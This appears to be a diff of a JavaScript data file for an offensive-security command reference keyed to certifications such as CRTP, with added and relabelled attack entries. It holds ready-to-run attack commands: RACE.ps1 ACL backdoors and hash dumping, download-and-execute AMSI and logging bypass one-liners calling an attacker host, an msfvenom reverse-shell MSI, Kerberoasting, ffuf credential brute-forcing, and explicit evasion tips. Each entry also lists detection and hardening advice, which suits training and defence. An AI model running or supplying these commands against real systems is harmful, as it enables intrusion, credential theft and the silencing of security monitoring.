@@ -181,7 +181,143 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Group Policy Objects (GPOs) are linked to OUs containing domain computers and users, but non-admin accounts have been granted CreateChild, WriteProperty, or GenericAll rights on those GPOs or the OUs they're linked to. An attacker with GPO write access can push immediate configuration changes to all machines in the scope — including adding themselves to local admins, deploying startup scripts, or disabling AV.",
         "vulnerable_config": "# Finding GPOs with weak ACEs:\nGet-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |\n    Where-Object {\n        $_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericAll' -and\n        $_.IdentityReference -notmatch 'Domain Admins|SYSTEM|Enterprise Admins'\n    } | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights",
-        "secure_config": "# Remove edit rights from non-admin accounts:\n# Group Policy Management Console (GPMC):\n# GPO -> Delegation tab -> Remove non-admin entries or change to Read-only\n\n# PowerShell — enumerate and review:\nGet-GPPermissions -Guid <gpo-guid> -All\n# Remove write access:\nSet-GPPermissions -Guid <gpo-guid> -TargetName 'helpdesk' \\\n    -TargetType Group -PermissionLevel GpoRead\n\n# Alert on GPO changes:\n# Event 5136 (Directory Service Object Modified) with objectClass = groupPolicyContainer\n# Event 4657 (Registry value modified) after GPO applies\n# Microsoft Defender for Identity: 'Suspicious GPO modification' alert"
+        "secure_config": "# Remove edit rights from non-admin accounts:\n# Group Policy Management Console (GPMC):\n# GPO -> Delegation tab -> Remove non-admin entries or change to Read-only\n\n# PowerShell — enumerate and review:\nGet-GPPermissions -Guid <gpo-guid> -All\n# Remove write access:\nSet-GPPermissions -Guid <gpo-guid> -TargetName 'helpdesk' \\\n    -TargetType Group -PermissionLevel GpoRead\n\n# Alert on GPO changes:\n# Event 5136 (Directory Service Object Modified) with objectClass = groupPolicyContainer\n# Event 4657 (Registry value modified) after GPO applies\n# Microsoft Defender for Identity: 'Suspicious GPO modification' alert",
+        "evasion": "Revert the GPO change after it executes; scope the malicious setting to one OU; time it around a normal gpupdate window."
+      }
+    },
+    {
+      "id": "crtp-race-backdoors",
+      "name": "ACL Backdoors with RACE.ps1 (WMI / PSRemoting / Registry)",
+      "command": "Set-RemoteWMI -SamAccountName <user> -ComputerName <host> -namespace 'root\\cimv2' -Verbose",
+      "description": "RACE (Remote ACL Configuration Enabler) drops stealthy DACL-based backdoors so a chosen low-priv user keeps remote access without new accounts or credentials. It edits security descriptors for WMI, PowerShell Remoting, and remote registry, and can pull a machine-account hash - persistence that survives password resets.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Persistence",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "moderate",
+      "mitre": [
+        "T1098",
+        "T1546",
+        "T1112"
+      ],
+      "tools": [
+        "RACE.ps1"
+      ],
+      "tags": [
+        "acl-backdoor",
+        "persistence",
+        "wmi",
+        "psremoting",
+        "remote-registry",
+        "race",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "PowerShell Remoting backdoor",
+          "command": "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host> -Verbose"
+        },
+        {
+          "label": "Remote registry backdoor (read machine secrets)",
+          "command": "Add-RemoteRegBackdoor -ComputerName <host> -Trustee <user> -Verbose"
+        },
+        {
+          "label": "Retrieve the machine account hash remotely",
+          "command": "Get-RemoteMachineAccountHash -ComputerName <host> -Verbose"
+        },
+        {
+          "label": "Set-ADACL - grant rights on an AD object (RACE)",
+          "command": "Set-ADACL -SamAccountName <user> -DistinguishedName <object_dn> -Right <right> -Verbose"
+        },
+        {
+          "label": "Retrieve local account hashes remotely",
+          "command": "Get-RemoteLocalAccountHash -ComputerName <host> -Verbose"
+        },
+        {
+          "label": "Retrieve domain cached credentials",
+          "command": "Get-RemoteCachedCredential -ComputerName <host> -Verbose"
+        },
+        {
+          "label": "Dump hashes across many hosts (Get-PassHashes)",
+          "command": "Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <hostlist>)"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Import RACE",
+          "command": ". C:\\AD\\Tools\\RACE.ps1"
+        },
+        {
+          "label": "Grant studentx remote WMI on the DC",
+          "command": "Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\\cimv2' -Verbose"
+        },
+        {
+          "label": "Verify by querying WMI as that user",
+          "command": "gwmi -class win32_operatingsystem -ComputerName dcorp-dc"
+        },
+        {
+          "label": "Add remote-registry backdoor + pull machine hash",
+          "command": "Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose; Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose"
+        }
+      ],
+      "examples": [
+        {
+          "label": "PSRemoting backdoor then remote command",
+          "command": "Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose\nInvoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local"
+        }
+      ],
+      "notes": "RACE modifies security descriptors (not group membership), so the backdoor is invisible to 'who is a Domain Admin' checks and needs local admin only at setup time. The remote-registry backdoor exposes SAM/LSA secrets and lets Get-RemoteMachineAccountHash retrieve the computer's NTLM hash - which then enables silver tickets (crtp-silver-ticket). Requires admin on the target when applying. Complements crtp-acl-persistence (AD DACL / DCSync) and crtp-adminsdholder.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "RACE.ps1 (GitHub)",
+          "url": "https://github.com/samratashok/RACE"
+        },
+        {
+          "title": "MITRE ATT&CK T1098 - Account Manipulation",
+          "url": "https://attack.mitre.org/techniques/T1098/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-credential-dumping",
+          "note": "Local admin on the target (needed to apply RACE) usually comes from a cred dump",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-silver-ticket",
+          "note": "Use the retrieved machine hash to forge silver tickets",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-acl-persistence",
+          "note": "AD-object DACL backdoor (DCSync) is the domain-level counterpart",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "prerequisites": "Local admin on the target host (to modify WMI/WinRM/registry security descriptors). A principal to grant access to (existing low-priv user - no new account needed).",
+        "why_it_works": "WMI namespaces, the WinRM/PowerShell endpoint, and remote registry each have their own DACL. Granting a user access there provides durable remote entry without touching AD group membership, so standard privileged-group audits miss it; the security-descriptor change persists across password changes.",
+        "misconfiguration": "No baselining of WMI/WinRM/registry DACLs; local admin widely available; no alerting on security-descriptor modifications; remote registry enabled.",
+        "impact": "Stealthy, resilient remote access and remote code execution as a low-priv user, plus machine-hash retrieval enabling silver tickets - persistence that survives credential resets and evades group-based detection.",
+        "detection": "Modifications to WMI namespace security (Set-WmiNamespaceSecurity patterns), WinRM RootSDDL changes, and registry key DACL edits (Event 4670 - permissions changed); RACE function names in Script Block Logging (4104); unexpected remote WMI/WinRM/registry access by a non-admin user afterward.",
+        "artifacts": "Altered DACLs on root\\cimv2, WSMan RootSDDL, and HKLM keys; 4670 permission-change events; later 4624 type-3 logons + WMI/WinRM access from the backdoored user.",
+        "vulnerable_config": "# Default WMI/WinRM/registry DACLs unmonitored\n# Remote Registry enabled; local admin broadly held\n# No SACL auditing on these objects",
+        "secure_config": "# Baseline + monitor WMI namespace, WinRM RootSDDL, and registry DACLs\n# Enable object-access auditing (4670) on these securable objects\n# Disable Remote Registry; restrict local admin (LAPS + tiering)\n# Alert on RACE cmdlet names in Script Block Logging",
+        "prevention": "Baseline and alert on WMI/WinRM/registry DACL changes; enable permission-change auditing; restrict local admin (LAPS, tiering); disable Remote Registry. [MITRE M1047, M1026, M1028]",
+        "evasion": "No new account or group change (evades DA-membership audits); reuses an existing user; security-descriptor edits are low-signal without explicit DACL monitoring.",
+        "sources": [
+          "CRTP",
+          "MITRE T1098",
+          "MITRE T1546"
+        ]
       }
     },
     {
@@ -284,7 +420,13 @@ const COMMAND_DATA = {
         "misconfiguration": "No AD object auditing (Event 5136 not enabled). No SIEM alert on domain NC ACL changes. No quarterly ACL audit for DCSync rights.",
         "vulnerable_config": "# No audit on AD object changes:\n# Advanced Audit Policy: DS Access → Audit Directory Service Changes: NOT CONFIGURED\n# → Event 5136 not generated → ACL changes invisible\n\n# DCSync right added silently:\nAdd-ObjectAcl -PrincipalIdentity backdoor_account -Rights DCSync\n# No event generated if DS auditing disabled",
         "secure_config": "# Enable DS Access auditing via GPO:\n# Computer Config → Windows Settings → Security Settings → Advanced Audit Policy\n# → DS Access → Audit Directory Service Changes: Success,Failure\n\n# SIEM rule:\n# EventID=5136 AND ObjectDN='DC=corp,DC=local' AND AttributeLDAPDisplayName='nTSecurityDescriptor'\n# → CRITICAL ALERT: domain ACL changed\n\n# Quarterly DCSync right audit:\nGet-ObjectAcl 'DC=corp,DC=local' -ResolveGUIDs | Where-Object {\n  $_.ObjectAceType -match 'DS-Replication-Get-Changes' -and\n  $_.IdentityReference -notmatch 'Enterprise Domain Controllers|ENTERPRISE DOMAIN CONTROLLERS'\n} | Format-List IdentityReference,ObjectAceType"
-      }
+      },
+      "variations": [
+        {
+          "label": "Grant via RACE Set-ADACL",
+          "command": "Set-ADACL -SamAccountName <user> -DistinguishedName '<object_dn>' -Right DCSync -Verbose"
+        }
+      ]
     },
     {
       "id": "ad-admodule-spn",
@@ -351,7 +493,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Get-ADUser -Filter {ServicePrincipalName -like '*'} lists accounts with SPNs - the Kerberoasting target list.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. servicePrincipalName is a readable user attribute, so filtering for accounts that have one reveals every Kerberoastable service account.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "A list of Kerberoastable service accounts.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -368,6 +510,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "ActiveDirectory"
+      ],
+      "variations": [
+        {
+          "label": "Show the SPN values",
+          "command": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | select name,ServicePrincipalName"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find SPN (service) accounts",
+          "command": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName"
+        },
+        {
+          "label": "Kerberoast them",
+          "command": ".\\Rubeus.exe kerberoast /nowrap"
+        }
       ]
     },
     {
@@ -439,7 +597,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Get-ADDomain returns domain-wide configuration (SID, functional level, policies) via LDAP.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. Get-ADDomain reads the domain naming context (SID, functional level, PDC) available to any user.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "Domain topology and identifiers used to plan further attacks.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -456,6 +614,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "ActiveDirectory"
+      ],
+      "variations": [
+        {
+          "label": "Just the key fields",
+          "command": "Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID,PDCEmulator"
+        },
+        {
+          "label": "Forest info",
+          "command": "Get-ADForest | select Name,RootDomain,Domains,GlobalCatalogs"
+        }
       ]
     },
     {
@@ -527,7 +695,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Get-ADTrust enumerates domain/forest trust relationships for cross-domain attack paths.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. trustedDomain objects are readable, exposing the trust graph (direction, transitivity) used to plan cross-domain attacks.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "A map of trusts to pivot across domains/forests.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -544,6 +712,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "ActiveDirectory"
+      ],
+      "variations": [
+        {
+          "label": "External/forest trusts only",
+          "command": "Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'"
+        }
       ]
     },
     {
@@ -628,6 +802,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "ActiveDirectory"
+      ],
+      "variations": [
+        {
+          "label": "Import the DLL directly (no RSAT install)",
+          "command": "Import-Module .\\Microsoft.ActiveDirectory.Management.dll"
+        }
       ]
     },
     {
@@ -937,6 +1117,11 @@ const COMMAND_DATA = {
       ],
       "recommended": [
         {
+          "id": "crtp-powerview-domain",
+          "rel": "prereq",
+          "note": "Enumerate the domain first to locate the CA and a vulnerable certificate template"
+        },
+        {
           "id": "crtp-dcsync",
           "note": "DCSync with DA TGT obtained via cert",
           "rel": "next"
@@ -978,7 +1163,21 @@ const COMMAND_DATA = {
         "misconfiguration": "Certificate template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled AND Client Authentication EKU AND is enrollable by Domain Users. No CA Manager Approval. CA auditing not enabled.",
         "vulnerable_config": "# Find vulnerable templates (Certify / Certipy):\nCertify.exe find /vulnerable\n# [!] Vulnerable Certificate Templates:\n# Template: UserTemplate\n# Enrollee Supplies Subject: True\n# Extended Key Usages: Client Authentication\n# Enrollment Permissions: Domain Users\n# → ANY domain user can request cert as DA!\n\n# CA has no Manager Approval:\n# Certificate Templates → UserTemplate → Properties → Issuance Requirements\n# → CA certificate manager approval: unchecked = auto-issue = VULNERABLE",
         "secure_config": "# Fix ESC1: disable 'Supply in the request':\n# Certificate Templates MMC → right-click template → Properties\n# → Subject Name tab → 'Supply in the request': UNCHECK\n# → 'Build from Active Directory information': CHECK\n\n# Or require CA Manager Approval:\n# → Issuance Requirements → CA certificate manager approval: CHECK\n\n# Audit vulnerable templates:\nCertify.exe find /vulnerable\nCertipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable\n\n# Enable CA audit logging:\n# CA Properties → Auditing → Issue and manage certificate requests: CHECK\n# Event 4887 will log all certificate issuances"
-      }
+      },
+      "variations": [
+        {
+          "label": "Enumerate CAs",
+          "command": "Certify.exe cas"
+        },
+        {
+          "label": "Find vulnerable templates",
+          "command": "Certify.exe find /vulnerable"
+        },
+        {
+          "label": "Find templates where enrollee supplies subject (ESC1)",
+          "command": "Certify.exe find /enrolleeSuppliesSubject"
+        }
+      ]
     },
     {
       "id": "crtp-adcs-esc3",
@@ -1045,6 +1244,11 @@ const COMMAND_DATA = {
         }
       ],
       "recommended": [
+        {
+          "id": "crtp-powerview-domain",
+          "rel": "prereq",
+          "note": "Enumerate the domain first to locate the CA and a vulnerable certificate template"
+        },
         {
           "id": "crtp-adcs-esc1",
           "note": "ESC1 simpler if template allows SAN",
@@ -1787,6 +1991,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "adidnsdump"
+      ],
+      "variations": [
+        {
+          "label": "Resolve records too",
+          "command": "adidnsdump -u <domain>\\<user> -p <password> ldap://<dc_ip> -r"
+        }
       ]
     },
     {
@@ -1887,7 +2097,13 @@ const COMMAND_DATA = {
         "misconfiguration": "No monitoring of AdminSDHolder DACL. No SIEM alert on CN=AdminSDHolder modifications. SDProp interval not adjusted (60 min window for detection and response).",
         "vulnerable_config": "# No audit on AdminSDHolder:\n# DS Access auditing not enabled → Event 5136 not generated\n\n# AdminSDHolder DACL with backdoor ACE:\nGet-ObjectAcl 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -ResolveGUIDs | Where-Object {\n  $_.IdentityReference -match 'backdoor_account'\n}\n# Output: backdoor_account — GenericAll — propagates to ALL protected group members in 60 min",
         "secure_config": "# Audit AdminSDHolder specifically:\n# Enable DS Access → Event 5136, then:\n# SIEM: EventID=5136 AND ObjectDN='CN=AdminSDHolder,CN=System,DC=corp,DC=local' → CRITICAL ALERT\n\n# Baseline and monitor AdminSDHolder DACL:\n$base = Get-ObjectAcl 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -ResolveGUIDs\n# Save $base to file; run daily comparison:\n$current = Get-ObjectAcl 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -ResolveGUIDs\nCompare-Object $base $current -Property IdentityReference,ActiveDirectoryRights\n# Any addition → INCIDENT RESPONSE\n\n# Reduce SDProp interval (reduces window for ACE to take effect):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\n# AdminSDProtectFrequency = 300  (5 minutes instead of 60)"
-      }
+      },
+      "variations": [
+        {
+          "label": "Trigger SDProp immediately",
+          "command": "Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose"
+        }
+      ]
     },
     {
       "id": "cdsa-m12-yara-advanced",
@@ -2074,6 +2290,141 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1218.007"
+        ],
+        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
+      },
+      "variations": [
+        {
+          "label": "Confirm both registry keys are set",
+          "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+        },
+        {
+          "label": "PowerUp exploit (adds admin)",
+          "command": "Write-UserAddMSI"
+        },
+        {
+          "label": "msfvenom MSI payload",
+          "command": "msfvenom -p windows/x64/shell_reverse_tcp lhost=<lhost> lport=<lport> -f msi -o aie.msi"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Check AlwaysInstallElevated is 1 in BOTH HKCU and HKLM",
+          "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+        },
+        {
+          "label": "Install the malicious MSI as SYSTEM",
+          "command": "msiexec /quiet /qn /i c:\\path\\aie.msi"
+        }
+      ]
+    },
+    {
+      "id": "crtp-amsi-sbl-bypass",
+      "name": "AMSI & Script Block Logging Bypass (one-liner)",
+      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/<amsi_bypass>.txt')",
+      "description": "Download-and-execute one-liners that patch AMSI (AmsiScanBuffer) and disable Script Block Logging in the current PowerShell session before loading offensive scripts. In CRTP these are served as sbloggingbypass.txt and Amsi-Byp.txt and iex'd in-memory so nothing hits disk and script content is not logged.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Evasion",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "moderate",
+      "mitre": [
+        "T1562.001",
+        "T1059.001",
+        "T1140"
+      ],
+      "tools": [
+        "powershell"
+      ],
+      "tags": [
+        "amsi-bypass",
+        "script-block-logging",
+        "in-memory",
+        "evasion",
+        "powershell",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "Script Block Logging bypass",
+          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/sbloggingbypass.txt')"
+        },
+        {
+          "label": "AMSI bypass",
+          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/Amsi-Byp.txt')"
+        },
+        {
+          "label": "Then load a tool in-memory",
+          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/PowerView.ps1')"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Disable Script Block Logging",
+          "command": "iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')"
+        },
+        {
+          "label": "Disable AMSI",
+          "command": "iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')"
+        },
+        {
+          "label": "Load PowerView fileless",
+          "command": "iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')"
+        }
+      ],
+      "examples": [
+        {
+          "label": "Full three-step in-memory load",
+          "command": "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt)\niex (iwr -UseBasicParsing http://172.16.100.x/Amsi-Byp.txt)\niex (iwr -UseBasicParsing http://172.16.100.x/PowerView.ps1)"
+        }
+      ],
+      "notes": "Order matters: disable Script Block Logging first, then AMSI, then load tooling - so the bypass scripts themselves aren't logged. These are session-scoped (per powershell.exe). InviShell (crtp-invishell) achieves the same via COR_PROFILER without hosting files; Loader.exe (crtp-loader) is the equivalent for .NET assemblies. Bypass strings are signatured - obfuscate/rehost when caught.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "MITRE ATT&CK T1562.001 - Impair Defenses",
+          "url": "https://attack.mitre.org/techniques/T1562/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-invishell",
+          "note": "Fileless alternative via COR_PROFILER (no hosting needed)",
+          "rel": "alternative"
+        },
+        {
+          "id": "crtp-powerview-users-groups",
+          "note": "Load PowerView after the bypass and enumerate",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-loader",
+          "note": "Use Loader.exe for .NET assemblies (Rubeus/SafetyKatz)",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "prerequisites": "PowerShell execution and a reachable web host serving the bypass scripts (or the strings pasted inline).",
+        "why_it_works": "AMSI's AmsiScanBuffer and PowerShell's Script Block Logging both run in-process; a script executing in that session can patch the AMSI function pointer/return value and flip the ScriptBlockLogging setting cached in the ETW provider, so subsequent commands are neither scanned nor logged. Downloading via WebClient/iwr and iex keeps everything in memory.",
+        "misconfiguration": "AMSI + Script Block Logging trusted as the only PowerShell defense; no Constrained Language Mode; egress to arbitrary HTTP allowed; no alert on logging going silent.",
+        "impact": "Offensive PowerShell (PowerView, PowerUp, Invoke-Mimikatz) runs unscanned and unlogged in the session - the primary PowerShell telemetry is blinded before the real tooling loads.",
+        "detection": "The FIRST download-string/iex is usually still logged (before the bypass lands) - alert on iex + DownloadString/iwr to raw .txt. Sudden stop of 4104 events mid-session. AMSI 'AMSI_RESULT' anomalies; amsi.dll memory patch detected by ETW-TI EDR. Network: PowerShell process fetching .txt/.ps1 over HTTP.",
+        "artifacts": "Proxy/EDR record of powershell.exe GET to bypass .txt; a lone 4104 for the bypass one-liner followed by silence; RW patch of amsi.dll in process memory.",
+        "vulnerable_config": "# Full Language Mode PowerShell, AMSI on but no ETW-TI EDR\n# Unrestricted HTTP egress; logging not shipped/alerted on silence",
+        "secure_config": "# PowerShell Constrained Language Mode (blocks Add-Type/reflection tricks)\n# WDAC enforce so only signed scripts run\n# ETW-TI EDR to catch amsi.dll patching\n# Ship 4104 to SIEM; alert when a session logs the bypass one-liner or goes silent\n# Egress filtering / proxy allowlist",
+        "prevention": "Enforce Constrained Language Mode + WDAC signed-only. Use EDR with ETW-TI to detect AMSI patching. Alert on iex+DownloadString and on Script Block Logging silence. Restrict outbound HTTP. [MITRE M1042, M1038, M1040]",
+        "evasion": "Disable logging before AMSI so the bypass itself isn't captured; obfuscate the bypass strings; host on an internal IP; deliver inline instead of over HTTP.",
+        "sources": [
+          "CRTP",
+          "MITRE T1562.001",
+          "MITRE T1059.001"
         ]
       }
     },
@@ -2260,11 +2611,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "description": "Copy Antak ASPX shell to staging location",
-          "command": "cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx",
-          "label": "cp /usr/share/nishang/Antak-WebShe…"
-        },
-        {
           "description": "Edit Antak to set access credentials (line 14)",
           "command": "# Open Upload.aspx, find line 14:\n# String username = \"YourUsername\";\n# String password = \"YourPassword\";\n# Replace with your chosen creds then save",
           "label": "Open Upload.aspx, find line 14: # …"
@@ -2386,7 +2732,8 @@ const COMMAND_DATA = {
           "OWASP API4:2023",
           "CWE-400",
           "MITRE T1499.001"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       }
     },
     {
@@ -2417,12 +2764,12 @@ const COMMAND_DATA = {
         {
           "command": "for i in $(seq 1 100); do curl -s -X GET \"http://<target>/api/v1/<endpoint>/$i\" -H \"Authorization: Bearer <jwt_token>\" | jq '.id,.email,.name' 2>/dev/null; done",
           "caption": "Larger range — extract only key fields with jq",
-          "label": "Batch loop"
+          "label": "Loop IDs 1-100 (users)"
         },
         {
           "command": "for ((i=1; i<=20; i++)); do echo -n \"ID $i: \"; curl -s -X GET \"http://<target>/api/v1/suppliers/quarterly-reports/$i\" -H \"Authorization: Bearer <jwt_token>\" | jq -r '.[] | .reportDate' 2>/dev/null; done",
           "caption": "Enumerate report endpoint — extract specific field per object",
-          "label": "Batch loop"
+          "label": "Loop IDs 1-20 (reports)"
         }
       ],
       "examples": [
@@ -2490,7 +2837,7 @@ const COMMAND_DATA = {
     {
       "id": "api-ffuf-json-bruteforce",
       "name": "API Credential Brute-Force with ffuf (JSON Body)",
-      "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w <emails.txt>:EMAIL -u http://<target>/api/v1/authentication/<role>/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 100",
+      "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w <userlist>:EMAIL -u http://<target>/api/v1/authentication/<role>/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 100",
       "platform": "linux",
       "category": "Password Attacks",
       "subcategory": "Credential Brute-Force",
@@ -2501,7 +2848,7 @@ const COMMAND_DATA = {
         {
           "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<known_email>\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 50",
           "caption": "Password spray against single known email address",
-          "label": "ffuf brute"
+          "label": "Brute password (known email)"
         },
         {
           "command": "curl -X POST http://<target>/api/v1/authentication/customers/passwords/resets/email-otps -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\"}'\nffuf -u http://<target>/api/v1/authentication/customers/passwords/resets -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\", \"OTP\": \"FUZZ\", \"NewPassword\": \"NewP@ssw0rd1\"}' -w <(seq -w 0000 9999):FUZZ -t 50 -mr '\"SuccessStatus\":true'",
@@ -2509,14 +2856,14 @@ const COMMAND_DATA = {
           "label": "POST request"
         },
         {
-          "command": "ffuf -w <emails.txt>:EMAIL -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"<common_pass>\"}' -fr \"Invalid Credentials\" -mc 200",
+          "command": "ffuf -w <userlist>:EMAIL -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"<common_pass>\"}' -fr \"Invalid Credentials\" -mc 200",
           "caption": "Username/email enumeration with fixed password",
-          "label": "ffuf brute"
+          "label": "Brute email (known password)"
         },
         {
-          "command": "ffuf -w <wordlist.txt>:PASS -u http://<target>/api/v1/authentication/sign-in -X POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer <jwt>\" -d '{\"currentPassword\": \"PASS\", \"newPassword\": \"NewPass1!\"}' -fr \"incorrect\" -t 30",
+          "command": "ffuf -w <wordlist>:PASS -u http://<target>/api/v1/authentication/sign-in -X POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer <jwt>\" -d '{\"currentPassword\": \"PASS\", \"newPassword\": \"NewPass1!\"}' -fr \"incorrect\" -t 30",
           "caption": "Brute-force authenticated password-change endpoint",
-          "label": "ffuf brute"
+          "label": "Brute current-password (change-pw)"
         }
       ],
       "examples": [
@@ -2607,12 +2954,12 @@ const COMMAND_DATA = {
         {
           "command": "curl -s http://<target>/swagger/v1/swagger.json | jq '.paths | keys[]'",
           "caption": "Dump all API paths from Swagger spec to discover old/hidden endpoints",
-          "label": "Swagger/OpenAPI"
+          "label": "Swagger - /swagger/v1"
         },
         {
